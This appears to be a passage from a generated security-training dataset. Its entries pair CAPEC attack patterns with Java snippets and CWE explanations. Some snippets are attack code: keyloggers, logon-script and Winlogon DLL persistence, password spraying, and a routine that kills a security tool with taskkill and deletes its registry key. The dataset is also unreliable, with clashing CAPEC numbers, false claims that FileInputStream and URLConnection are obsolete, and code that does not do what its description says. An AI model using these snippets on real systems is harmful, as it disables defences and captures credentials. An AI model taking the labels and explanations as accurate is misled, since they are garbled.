        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Scanner;\n\npublic class AdminShareAccess {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter admin username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter admin password: \");\n        String password = scanner.nextLine();\n        System.out.print(\"Enter target machine IP: \");\n        String targetIP = scanner.nextLine();\n\n        try {\n            if (authenticate(username, password)) {\n                accessAdminShare(targetIP);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate single-factor authentication\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n\n    private static void accessAdminShare(String targetIP) throws UnknownHostException, IOException {\n        InetAddress inet = InetAddress.getByName(targetIP);\n        if (inet.isReachable(5000)) {\n            System.out.println(\"Accessing admin share on \" + targetIP);\n            // Simulate access to admin share\n        } else {\n            System.out.println(\"Target machine is not reachable.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where an attacker uses stolen or guessed Windows administrator credentials to access admin shares on a target machine. The code prompts the user for a username, password, and target machine IP address. It then performs a basic single-factor authentication check and attempts to access the admin share if authentication is successful. The code embodies the main idea of CAPEC-562 (Windows Admin Shares with Stolen Credentials) and highlights several related CWEs: CWE-522 (Insufficiently Protected Credentials), CWE-308 (Use of Single-factor Authentication), CWE-309 (Use of Password System for Primary Authentication), and CWE-521 (Weak Password Requirements). The code is vulnerable due to the use of hardcoded weak credentials, single-factor authentication, and lack of secure password handling."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SharedFileModifier {\n    public static void main(String[] args) {\n        String sharedFilePath = \"/shared/directory/sharedFile.txt\";\n        String maliciousContent = \"<script>alert('Hacked!');</script>\";\n\n        try {\n            // CWE-284: Improper Access Control\n            if (Files.isWritable(Paths.get(sharedFilePath))) {\n                // CWE-378: Creation of Temporary File With Insecure Permissions\n                File tempFile = File.createTempFile(\"tempFile\", \".txt\");\n                try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempFile))) {\n                    writer.write(maliciousContent);\n                }\n\n                // CWE-434: Unrestricted Upload of File with Dangerous Type\n                Files.copy(tempFile.toPath(), Paths.get(sharedFilePath), StandardCopyOption.REPLACE_EXISTING);\n\n                // CWE-494: Download of Code Without Integrity Check\n                // Simulating download of malicious code without integrity check\n                String downloadedCode = new String(Files.readAllBytes(Paths.get(sharedFilePath)));\n                System.out.println(\"Downloaded Code: \" + downloadedCode);\n\n                // CWE-433: Unparsed Raw Web Content Delivery\n                // Assuming the shared file is served by a web server\n                System.out.println(\"Shared file modified with malicious content.\");\n            } else {\n                System.out.println(\"No write access to the shared file.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary modifies a shared file by injecting malicious content. The code checks if the shared file is writable (CWE-284: Improper Access Control). It then creates a temporary file with potentially insecure permissions (CWE-378: Creation of Temporary File With Insecure Permissions) and writes malicious content to it. The temporary file is copied to the shared file location, replacing the original content (CWE-434: Unrestricted Upload of File with Dangerous Type). The code simulates downloading and executing the modified file without verifying its integrity (CWE-494: Download of Code Without Integrity Check). Finally, it assumes the shared file is served by a web server, potentially delivering unparsed raw web content (CWE-433: Unparsed Raw Web Content Delivery). This snippet embodies the CAPEC's main idea of modifying shared files to execute malicious content when accessed by users."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String uploadPath = getServletContext().getRealPath(\"\") + File.separator + \"uploads\";\n        File uploadDir = new File(uploadPath);\n        if (!uploadDir.exists()) {\n            uploadDir.mkdir();\n        }\n\n        for (Part part : request.getParts()) {\n            String fileName = getFileName(part);\n            part.write(uploadPath + File.separator + fileName);\n        }\n\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        String contentDisposition = part.getHeader(\"content-disposition\");\n        for (String cd : contentDisposition.split(\";\")) {\n            if (cd.trim().startsWith(\"filename\")) {\n                return cd.substring(cd.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerable file upload mechanism. The servlet handles file uploads by saving them directly to a directory under the web root without proper validation or access control. This can lead to several security issues as described in the CAPEC and related CWEs:\n\n1. **Improper Access Control (CWE-284)**: The code does not restrict access to the uploaded files, allowing unauthorized users to potentially access and execute them.\n2. **Storage of File with Sensitive Data Under Web Root (CWE-219)**: Files are stored under the web root directory, making them accessible via a web browser.\n3. **Unparsed Raw Web Content Delivery (CWE-433)**: The code does not parse or validate the content of the uploaded files, which could lead to the execution of malicious scripts.\n4. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The code relies on the file name and extension provided by the user, which can be manipulated to upload dangerous files.\n5. **Download of Code Without Integrity Check (CWE-494)**: Although not directly shown in this snippet, the lack of integrity checks on uploaded files can lead to the execution of malicious code.\n\nOverall, this code snippet embodies the main idea of the CAPEC by demonstrating how an adversary could upload malicious content to a web server, potentially leading to severe security breaches."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class LogonScriptModifier {\n    private static final String LOGON_SCRIPT_PATH = \"C:\\\\Users\\\\Public\\\\logon.bat\";\n    private static final String MALICIOUS_CODE = \"echo Malicious code executed\";\n    private static final String HARD_CODED_PASSWORD = \"password123\"; // CWE-259\n\n    public static void main(String[] args) {\n        try {\n            // Check if the logon script exists\n            if (Files.exists(Paths.get(LOGON_SCRIPT_PATH))) {\n                // Read the existing logon script\n                String scriptContent = new String(Files.readAllBytes(Paths.get(LOGON_SCRIPT_PATH)));\n                // Append malicious code to the logon script\n                scriptContent += \"\\n\" + MALICIOUS_CODE;\n                // Write the modified script back to the file\n                Files.write(Paths.get(LOGON_SCRIPT_PATH), scriptContent.getBytes());\n                System.out.println(\"Logon script modified successfully.\");\n            } else {\n                System.out.println(\"Logon script not found.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Simulate a method that uses hard-coded credentials (CWE-798)\n    private static boolean authenticate(String username, String password) {\n        return \"admin\".equals(username) && HARD_CODED_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can modify a logon script to include malicious code, which will be executed every time a user logs on. The code checks if a logon script exists at a specified path, reads its content, appends malicious code, and writes it back. This represents the CAPEC 'Run Software at Logon' by showing how an attacker can maintain persistence. Additionally, the code includes hard-coded credentials (CWE-259 and CWE-798), which are insecure and can be exploited by attackers to gain unauthorized access."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PasswordSprayingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Sample user database with weak passwords\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password123\");\n        userDatabase.put(\"user3\", \"password123\");\n\n        // Password spraying attack simulation\n        String[] commonPasswords = {\"password123\", \"123456\", \"qwerty\"};\n\n        for (String password : commonPasswords) {\n            for (String user : userDatabase.keySet()) {\n                if (authenticate(user, password)) {\n                    System.out.println(\"User \" + user + \" authenticated successfully with password: \" + password);\n                } else {\n                    System.out.println(\"Failed to authenticate user \" + user + \" with password: \" + password);\n                }\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (userDatabase.containsKey(username) && userDatabase.get(username).equals(password)) {\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Password Spraying attack. The code initializes a user database with weak passwords and simulates an attack by trying a small list of common passwords against each user account. The `authenticate` method checks if the provided password matches the stored password for a given user. If the number of failed attempts exceeds a maximum threshold, the account is locked. This example highlights several weaknesses: weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308). The code illustrates how an attacker can exploit these weaknesses to perform a Password Spraying attack."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class PasswordHasher {\n    public static void main(String[] args) {\n        String password = \"password123\";\n        String salt = \"1234\"; // Predictable salt\n        String hashedPassword = hashPassword(password, salt);\n        System.out.println(\"Hashed Password: \" + hashedPassword);\n    }\n\n    public static String hashPassword(String password, String salt) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n            md.update(salt.getBytes());\n            byte[] hashedBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashedBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of a one-way cryptographic hash (SHA-256) to hash a password with a predictable salt. The main idea is to highlight the vulnerability described in CWE-760, where the use of a predictable salt can weaken the security of the hashed password. The code takes a password and a salt, combines them, and generates a hashed password. However, because the salt is predictable, it makes the hash more susceptible to attacks such as rainbow table attacks. This snippet embodies the deprecated CAPEC concept of dumping password hashes and highlights the importance of using a strong, unpredictable salt to enhance security."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        Properties config = new Properties();\n        try {\n            // Using an obsolete method to load configuration\n            FileInputStream fis = new FileInputStream(new File(\"config.properties\"));\n            config.load(fis);\n            fis.close();\n\n            // Using DNS lookup in a security decision\n            String serverAddress = config.getProperty(\"server.address\");\n            if (serverAddress.equals(\"trusted.server.com\")) {\n                System.out.println(\"Trusted server\");\n            } else {\n                System.out.println(\"Untrusted server\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration loader that embodies the deprecated CAPEC 'Obtain Data via Utilities' and related CWEs. The code uses an obsolete method (FileInputStream) to load configuration data from a properties file, which aligns with CWE-477 (Use of Obsolete Function). Additionally, it makes a security decision based on a DNS lookup (CWE-247, deprecated in favor of CWE-350), which can be exploited if the DNS resolution is compromised. The code reads a server address from a configuration file and checks if it matches a trusted server address, printing a message based on the result. This approach is insecure as it relies on potentially untrusted data and outdated methods."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport javax.swing.JFrame;\n\npublic class Keylogger extends JFrame implements KeyListener {\n    private static final String LOG_FILE = \"keystrokes.log\";\n\n    public Keylogger() {\n        this.addKeyListener(this);\n        this.setSize(300, 200);\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        this.setVisible(true);\n    }\n\n    @Override\n    public void keyTyped(KeyEvent e) {}\n\n    @Override\n    public void keyPressed(KeyEvent e) {\n        logKeystroke(e.getKeyChar());\n    }\n\n    @Override\n    public void keyReleased(KeyEvent e) {}\n\n    private void logKeystroke(char keyChar) {\n        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {\n            writer.write(keyChar);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        new Keylogger();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple keylogger application. The keylogger captures all keystrokes made by the user and logs them to a file named 'keystrokes.log'. The Keylogger class extends JFrame and implements the KeyListener interface to capture key events. When a key is pressed, the keyPressed method is triggered, which calls the logKeystroke method to write the character to the log file. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing user input, which could include sensitive information like passwords. The related CWEs provide context on potential weaknesses, such as the use of password systems (CWE-309), hard-coded credentials (CWE-798), and insufficiently protected credentials (CWE-522), which could be exploited by such a keylogger."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import java.io.Console;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class Keylogger {\n    public static void main(String[] args) {\n        Console console = System.console();\n        if (console == null) {\n            System.err.println(\"No console available\");\n            System.exit(1);\n        }\n        try (FileWriter writer = new FileWriter(\"keystrokes.txt\", true)) {\n            while (true) {\n                String input = console.readLine(\"Enter sensitive information: \");\n                writer.write(input + \"\\n\");\n                writer.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple keylogger that captures user input from the console and writes it to a file named 'keystrokes.txt'. The code continuously prompts the user to enter sensitive information and logs each input. This embodies the CAPEC idea of collecting data as provided by users without their knowledge. The code also touches on related CWEs: it exposes sensitive information (CWE-200) by writing it to a file, and it could be misused to invoke processes with sensitive information (CWE-214). The keylogger does not prevent unauthorized access to the logged data (CWE-497), and it could be part of a larger attack that leverages .NET misconfiguration (CWE-520) or improper handling of alternate data streams (CWE-69)."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            URL url = new URL(\"http://example.com\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            // Unchecked error condition (CWE-391)\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the main idea of the deprecated CAPEC 'Signature-Based Avoidance' and related CWEs. The code uses the obsolete function `URLConnection` (CWE-477) to open a connection to a URL and read its content. Additionally, it catches a generic `Exception` and prints the stack trace without proper error handling (CWE-391). This lack of specific error handling can lead to security issues, as it does not adequately address potential exceptions that may occur during the execution of the code."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class LoggingExample {\n    private static final Logger logger = Logger.getLogger(LoggingExample.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup local file logging\n            FileHandler fh = new FileHandler(\"local_log.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information\n            logger.info(\"User password: secret123\");\n\n            // Simulate blocking central logging\n            blockCentralLogging();\n\n            // Log an event that should be sent to the central repository\n            logger.info(\"Security-critical event: User login attempt failed\");\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void blockCentralLogging() {\n        // Simulate blocking the central logging mechanism\n        System.out.println(\"Central logging blocked\");\n    }\n}",
        "description": "This Java code snippet demonstrates a logging mechanism that writes logs to a local file and includes sensitive information in the logs. It also simulates blocking the delivery of logs to a central repository, which aligns with the CAPEC 'Block Logging to Central Repository'. The code includes CWE-532 by logging sensitive information, CWE-778 by insufficiently logging a security-critical event, and CWE-779 by potentially logging excessive data. The 'blockCentralLogging' method represents the adversary's action to prevent logs from being sent to a central location, hiding indicators of compromise."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileInflation {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        try {\n            // Create a file if it doesn't exist\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Inflate the file size by appending large data\n            try (FileOutputStream fos = new FileOutputStream(file, true)) {\n                byte[] largeData = new byte[1024 * 1024 * 10]; // 10 MB of data\n                fos.write(largeData);\n            }\n\n            // Print the file size\n            long fileSize = Files.size(Paths.get(filePath));\n            System.out.println(\"File size: \" + fileSize + \" bytes\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of artificially inflating file sizes, which is the main idea of the CAPEC. The code creates a file named 'example.txt' if it doesn't already exist and then appends 10 MB of data to it. This can lead to a Denial of Service (DoS) condition on systems with limited storage capacity. The code also prints the file size after inflating it. This example touches on CWE-774 (Allocation of File Descriptors or Handles Without Limits or Throttling) by not imposing any restrictions on file size, and CWE-409 (Improper Handling of Highly Compressed Data) by potentially allowing large data to be written without checks."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ProcessFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all running processes\n            Process process = Runtime.getRuntime().exec(\"ps -aux\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of process footprinting. It executes a system command to list all running processes (`ps -aux`) and prints the output to the console. This can expose sensitive information about the system's processes to unauthorized users (CWE-200). The code does not restrict access to the process information, which can lead to exposure of sensitive system-level information (CWE-497). Additionally, the command-line arguments and environment variables used in the process invocation can be visible to other processes (CWE-214). This snippet embodies the main idea of CAPEC-169 by showing how an adversary can exploit functionality meant to identify information about currently running processes to gather information about the target environment."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ServiceFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Command to list all services running on the system\n            String command = \"tasklist /svc\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of 'Services Footprinting' by executing a system command to list all services running on the target system. The command 'tasklist /svc' is used to obtain the list of services, and the output is printed to the console. This exposes sensitive information about the system's services to any user who runs the program, which aligns with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code also highlights CWE-214 (Invocation of Process Using Visible Sensitive Information) as the command and its output can be seen by other processes on the operating system. This snippet represents the main idea of CAPEC-170 by showing how an adversary can exploit functionality meant for authorized users to gather information about the target system's services."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class AccountFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all users on the system\n            Process process = Runtime.getRuntime().exec(\"net user\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of 'Account Footprinting' by executing a system command to list all user accounts on a Windows system using 'net user'. The output of this command, which includes sensitive information about user accounts, is then printed to the console. This embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes potentially sensitive account information to any user running this code. The code also touches on CWE-214 (Invocation of Process Using Visible Sensitive Information) as the command and its output can be visible to other processes on the system."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class GroupPermissionFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute the command to list local groups\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to 'Group Permission Footprinting' (CAPEC-). The code executes a system command ('net localgroup') to list all local groups on a Windows system. The output of this command, which includes sensitive information about user groups and their permissions, is then printed to the console. This can expose sensitive information (CWE-200) to unauthorized actors. The code also indirectly highlights the risk of placing users into incorrect groups (CWE-842) and the exposure of access control list files (CWE-529) by making such information easily accessible. Additionally, the invocation of the process with visible sensitive information (CWE-214) and the creation of emergent resources (CWE-1229) are implicit risks in this context."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class OwnerFootprinting {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java OwnerFootprinting <directory>\");\n            return;\n        }\n\n        File dir = new File(args[0]);\n        if (!dir.isDirectory()) {\n            System.out.println(\"Provided path is not a directory\");\n            return;\n        }\n\n        File[] files = dir.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                try {\n                    BasicFileAttributes attrs = Files.readAttributes(file.toPath(), BasicFileAttributes.class);\n                    System.out.println(\"File: \" + file.getName() + \", Last Modified Time: \" + attrs.lastModifiedTime());\n                } catch (IOException e) {\n                    System.out.println(\"Error reading attributes for file: \" + file.getName());\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Owner Footprinting' by listing files in a specified directory and printing their last modified times. This information can be used to infer user activity on the system. The code takes a directory path as an argument, checks if it is a valid directory, and then iterates over the files in that directory to print their last modified times. This can expose sensitive information about user activity to unauthorized actors, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class DisableSecuritySoftware {\n    private static final Logger logger = Logger.getLogger(DisableSecuritySoftware.class.getName());\n    private static final String SECURITY_TOOL_PROCESS = \"SecurityTool.exe\";\n    private static final String HARD_CODED_ADMIN_PASSWORD = \"admin123\";\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to kill the security tool process\n            Process process = Runtime.getRuntime().exec(\"taskkill /F /IM \" + SECURITY_TOOL_PROCESS);\n            process.waitFor();\n            logger.log(Level.INFO, \"Security tool process killed.\");\n\n            // Delete registry key to prevent security tool from starting at runtime\n            Process regDelete = Runtime.getRuntime().exec(\"reg delete HKLM\\\\Software\\\\SecurityTool /f\");\n            regDelete.waitFor();\n            logger.log(Level.INFO, \"Registry key deleted.\");\n\n            // Use hard-coded credentials to perform unauthorized actions\n            if (authenticate(HARD_CODED_ADMIN_PASSWORD)) {\n                logger.log(Level.INFO, \"Authenticated with hard-coded credentials.\");\n                // Perform additional malicious actions\n            }\n        } catch (IOException | InterruptedException e) {\n            logger.log(Level.SEVERE, \"An error occurred.\", e);\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        // Simulate authentication check\n        return HARD_CODED_ADMIN_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary disables security software by exploiting improper access control and using hard-coded credentials. The code attempts to kill a security tool process, delete a registry key to prevent the tool from starting at runtime, and uses hard-coded credentials to perform unauthorized actions. This embodies the CAPEC 'Disable Security Software' by showing how an attacker can disable security mechanisms to avoid detection. The related CWEs are represented by the use of hard-coded credentials (CWE-798) and improper access control (CWE-284)."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class WinlogonHelperDLL {\n    public static void main(String[] args) {\n        // CWE-15: External Control of System or Configuration Setting\n        Preferences systemPrefs = Preferences.systemRoot();\n        try {\n            // CWE-798: Use of Hard-coded Credentials\n            System.setProperty(\"java.util.prefs.userRoot\", \"/path/to/user/root\");\n            System.setProperty(\"java.util.prefs.systemRoot\", \"/path/to/system/root\");\n            \n            // CWE-427: Uncontrolled Search Path Element\n            String dllPath = \"C:\\\\malicious\\\\helper.dll\";\n            \n            // Setting the Winlogon Helper DLL path in the registry\n            systemPrefs.put(\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit\", dllPath);\n            System.out.println(\"Winlogon Helper DLL path set to: \" + dllPath);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability by modifying a registry key to load a malicious DLL at startup. The code uses the Preferences API to access and modify system preferences, representing CWE-15 (External Control of System or Configuration Setting). It sets hard-coded paths for user and system roots (CWE-798: Use of Hard-coded Credentials) and specifies a DLL path that could be controlled by an attacker (CWE-427: Uncontrolled Search Path Element). This code is a simplified example of how an attacker could manipulate system settings to execute arbitrary code during the Windows logon process."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SystemFootprinting {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api/system-info\";\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                System.out.println(\"System Information: \" + response.toString());\n            } else if (responseCode == 404) {\n                System.out.println(\"Resource not found\");\n            } else {\n                System.out.println(\"Unexpected response code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of system footprinting by making an HTTP GET request to a target URL to retrieve system information. The code checks the response code to determine the state of the target system. If the response code is 200, it reads and prints the system information. If the response code is 404, it indicates that the resource was not found. This behavior can reveal internal state information (CWE-204) and differences in system behavior (CWE-205). Additionally, the time taken to receive different responses can be used to infer security-relevant information (CWE-208). The code also exposes sensitive system information to unauthorized actors (CWE-497) and relies on an external URL, which could be manipulated (CWE-426)."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecurityFootprint {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list installed security software\n            String command = \"wmic product get name,version\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Security Software Footprinting' by attempting to list all installed software on a Windows system using the 'wmic' command. The code executes a system command to retrieve the names and versions of installed products, which may include security tools. This information can be used by adversaries to identify and exploit vulnerabilities in the security software. The code also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing sensitive system information to unauthorized users. The use of external commands and the potential for misuse align with the concerns of embedded malicious code (CWE-506) and dependency on vulnerable third-party components (CWE-1395)."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class RouteDisablingExample {\n    private static final String TARGET_IP = \"192.168.1.100\";\n    private static final int TARGET_PORT = 8080;\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to establish a connection to the target\n            Socket socket = new Socket(TARGET_IP, TARGET_PORT);\n            System.out.println(\"Connection established to \" + TARGET_IP + \":\" + TARGET_PORT);\n\n            // Simulate route disabling by closing the socket\n            socket.close();\n            System.out.println(\"Route disabled: Connection closed.\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + TARGET_IP);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
